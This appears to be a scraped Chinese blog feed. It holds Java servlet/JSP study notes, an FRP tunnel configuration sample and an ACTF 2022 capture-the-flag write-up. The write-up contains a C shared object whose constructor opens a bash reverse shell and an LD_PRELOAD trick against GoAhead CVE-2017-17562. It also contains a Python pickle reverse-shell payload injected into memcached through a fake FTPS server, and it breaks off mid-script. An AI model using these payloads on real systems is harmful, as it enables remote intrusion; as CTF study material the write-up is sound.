encoding&#x3D;&quot;UTF-8&quot;?&gt;  &lt;web-app version&#x3D;&quot;2.4&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot;           xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;           xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee  http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-app_2_4.xsd&quot;&gt;      &lt;servlet&gt;          &lt;servlet-name&gt;MyFirstServletName&lt;&#x2F;servlet-name&gt;          &lt;servlet-class&gt;com.skyline.MyFirstServlet&lt;&#x2F;servlet-class&gt;      &lt;&#x2F;servlet&gt;      &lt;servlet-mapping&gt;          &lt;servlet-name&gt;MyFirstServletName&lt;&#x2F;servlet-name&gt;          &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;      &lt;&#x2F;servlet-mapping&gt;  &lt;&#x2F;web-app&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Web.xml文件的作用是告诉tomcat我们想要使用哪一个servlet来处理对应的请求，tomcat通过该文件来找到对应的servlet来完成请求及响应的过程</p></li><li><p>将生成的class文件以及web.xml文件按照下面的目录结构放入webapps文件夹下</p></li><li><p>```<br>webapps</p><ul><li>MyFirstServlet<ul><li>WEB-INF<ul><li>classes<ul><li>top<ul><li>darkflow<ul><li>MyFirstServlet.class</li></ul></li></ul></li></ul></li><li>web.xml<pre class="line-numbers language-none"><code class="language-none">- 重启tomcat服务并访问&#x2F;MyFirstServlet&#x2F;hello就能看到内容啦##### JSP- 从上面的代码中可以看出，直接使用servlet生成网页，不仅代码写起来麻烦，可维护性也不高，为了把HTML中的这些非逻辑的部分抽离出，我们引入了JSP技术- JSP全称为JavaServer Pages，可以将其理解成一种高度抽象的servlet，在JSP运行期间实际上会被编译为servlet- 使用jsp我们只需要在WEB-INF旁创建一个jsp文件并写入代码即可- &#96;&#96;&#96;jsp  &lt;!--test.jsp--&gt;  &lt;%@ page import&#x3D;&quot;java.time.LocalDateTime&quot; %&gt;  &lt;html&gt;  &lt;body&gt;  &lt;h2&gt;  &lt;%  out.write(LocalDateTime.now().toString());  %&gt;  &lt;&#x2F;h2&gt;  &lt;&#x2F;body&gt;  &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ul></li><li><p>此时我们访问/MyFirstServlet/test.jsp即可</p></li><li><p>一些语法</p><ul><li><code>&lt;% 代码片段 %&gt;</code>等价于<code>&lt;jsp:scriptlet&gt; 代码片段 &lt;/jsp:scriptlet&gt;</code></li><li><code>&lt;%! 一些变量声明 %&gt;</code>等价于<code>&lt;jsp:declaration&gt; 代码片段 &lt;/jsp:declaration&gt;</code></li></ul></li></ul>        <h2 id="Servlet-1"   >          <a href="#Servlet-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h2>      <p>配置文件web.xml的一个示例，通过配置文件来解析URL</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span>        <span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span>        <span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>downloadfile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>top.darkflow.Fileget<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>downloadfile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/down<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件下载</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Fileget</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"/Users/jlan/IdeaProjects/javaweb-02-servlet/response/src/main/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"下载文件路径为："</span><span class="token operator">+</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> fileName<span class="token operator">=</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span><span class="token string">"attachment:filename="</span><span class="token operator">+</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">ServletOutputStream</span> out<span class="token operator">=</span>resp<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取POST参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> login <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> a<span class="token operator">=</span>req<span class="token punctuation">.</span><span class="token function">getParameterNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> paraName<span class="token operator">=</span>a<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>paraName<span class="token operator">+</span><span class="token string">"="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>paraName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h4 id="JSP"   >          <a href="#JSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4>      <p>JSP在编译的时候会被转换成一个Java类</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;初始化pubilc void _jspInit()&#123;&#125;&#x2F;&#x2F;销毁public void _jspDestory()&#123;&#125;&#x2F;&#x2F;JSPServicepublic void _jspService()(HttpServletRequest request,HttpServletResponse response)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSP作用</p><p>判断请求</p><p>内置的一些对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>jsp<span class="token punctuation">.</span></span>PageContext</span> pageContext<span class="token comment">//页面上下文</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h1 id="Spring"   >          <a href="#Spring" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些小小工具的使用</title>
      <link href="/posts/78e6073f.html"/>
      <url>/posts/78e6073f.html</url>
      
        <content type="html"><![CDATA[        <h2 id="FRP"   >          <a href="#FRP" class="heading-link"><i class="fas fa-link"></i></a><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2>      <span id="more"></span>        <h3 id="FRPS（服务端配置）"   >          <a href="#FRPS（服务端配置）" class="heading-link"><i class="fas fa-link"></i></a><a href="#FRPS（服务端配置）" class="headerlink" title="FRPS（服务端配置）"></a>FRPS（服务端配置）</h3>      <pre class="line-numbers language-none"><code class="language-none">#frps.ini[common]bind_port        &#x3D; 7000                # 服务监听端口bind_addr        &#x3D; 0.0.0.0             # 监听IPtoken            &#x3D; 123456              # 密钥#以下为可选内容dashboard_port   &#x3D; 7500                # web面板dashboard_user   &#x3D; admin               # 面板用户名dashboard_pwd    &#x3D; admin               # 面板密码subdomain_host   &#x3D; *.darkflow.top      # WEB访问域名绑定（绑定后只能绑定子域名访问）vhost_http_port  &#x3D; 10000               # web服务http端口vhost_https_port &#x3D; 10001               # web服务https端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="FRPC（客户端配置）"   >          <a href="#FRPC（客户端配置）" class="heading-link"><i class="fas fa-link"></i></a><a href="#FRPC（客户端配置）" class="headerlink" title="FRPC（客户端配置）"></a>FRPC（客户端配置）</h3>      <pre class="line-numbers language-none"><code class="language-none">#frpc[common]server_addr &#x3D; 1.1.1.1             # 服务器IP或者地址server_port &#x3D; 7000                # 服务器提供的端口号token &#x3D; 123456                    # 服务器提供的token#以下为不同服务通用配置模版[服务名]type &#x3D; tcp                        # 协议类型local_ip &#x3D; 127.0.0.1              # 穿透的本地地址local_port &#x3D; 5001                 # 穿透的本地端口[服务名]type &#x3D; http                       # 协议类型local_ip &#x3D; 127.0.0.1              # 穿透的本地地址local_port &#x3D; 80                   # 穿透的本地端口custom_domains &#x3D; frp.darkflow.top # 填写你的域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF 2022</title>
      <link href="/posts/1c461d7e.html"/>
      <url>/posts/1c461d7e.html</url>
      
        <content type="html"><![CDATA[        <h1 id="ACTF-2022"   >          <a href="#ACTF-2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#ACTF-2022" class="headerlink" title="ACTF 2022"></a>ACTF 2022</h1>      <p><del>和学长一起熬大夜做不出来题真是太爽🌶️，下次继续</del></p><span id="more"></span>        <h2 id="gogogo"   >          <a href="#gogogo" class="heading-link"><i class="fas fa-link"></i></a><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2>      <p>是CVE，好耶</p><p><span class="exturl"><a class="exturl__link"   href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md" >CVE-2017-17562</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>先写弹shell的so文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">aaanb</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/IP/端口 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc -shared -fPIC ./payload.c -o payload.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的so文件作为文件发送，并且在请求头中添加<code>LD_PRELOAD=/proc/self/fd/0</code>，由于题目是公共环境。需要对最后数字进行爆破</p>        <h2 id="ToLeSion"   >          <a href="#ToLeSion" class="heading-link"><i class="fas fa-link"></i></a><a href="#ToLeSion" class="headerlink" title="ToLeSion"></a>ToLeSion</h2>      <p><del>熬一晚上没做出来的题</del></p><p>还是学到了很多东西的，先看题，curl访问链接，看了一下剩下的<del>我认识的</del>协议只有FTPS了，又题目中写了使用了memcached，外加题目环境是python，最终找到了<span class="exturl"><a class="exturl__link"   href="https://blog.zeddyu.info/2021/05/19/tls-ctf/" >这个</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，大概流程就是通过TLS复用，将payload放到TLS进行身份识别的SessionID的位置，导致非法的内容被注入到memcached中，然后更改sessionID将实现pickle反序列化来反弹shell</p><p>本题具体流程如下</p><ul><li>首先伪造一个FTPS服务器，并且利用代理更改TLS中SessionID为我们的payload</li><li>在受害者访问我们的FTPS服务器，通过被动连接的方式将数据链路的地址端口指向受害者本地的memcached服务</li><li>此时受害者对数据链路进行TLS会话复用，将带有payload的TLS客户端请求发送到memcached服务，导致memcached命令执行，将我们构造的序列化内容写入到目标的memcached库中</li><li>最后更改sessionID并重新访问网页，服务器取出序列化后内容反序列化，反弹shell</li></ul><p>OK上面的流程都已经懂了，那么我们怎么实现呢，首先是伪造服务器（来自学长的完整脚本）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> socketserver<span class="token keyword">import</span> sys<span class="token keyword">import</span> redis<span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> <span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/IP/端口 &lt;&amp;1'"</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pickle_code<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Test2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b"\r\nset actfSession:J1an 0 0 "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"\r\n"</span><span class="token operator">+</span>pickle_code<span class="token operator">+</span><span class="token string">b"\r\n"</span><span class="token keyword">def</span> <span class="token function">set_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'payload len: '</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"设置的sessionid为:"</span><span class="token punctuation">,</span>set_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload长度为:"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyTCPHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>StreamRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'[+] connected'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>request<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'220 (vsFTPd 3.0.3)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span>flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'257 "/" is the current directory\r\n'</span><span class="token punctuation">)</span><span class="token comment"># vps:importlib/a/b</span><span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span><span class="token comment">#         print(5,self.data, file=sys.stderr)</span><span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span><span class="token comment">#</span><span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span><span class="token comment">#         print(6,self.data, file=sys.stderr)</span><span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\r\n'</span><span class="token punctuation">)</span>        <span class="token comment"># self.data = self.rfile.readline().strip().decode()</span>        <span class="token comment"># # assert 'SIZE refs' == self.data, self.data</span>        <span class="token comment"># self.finish()</span>        <span class="token comment"># print(10,self.data, file=sys.stderr)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'213 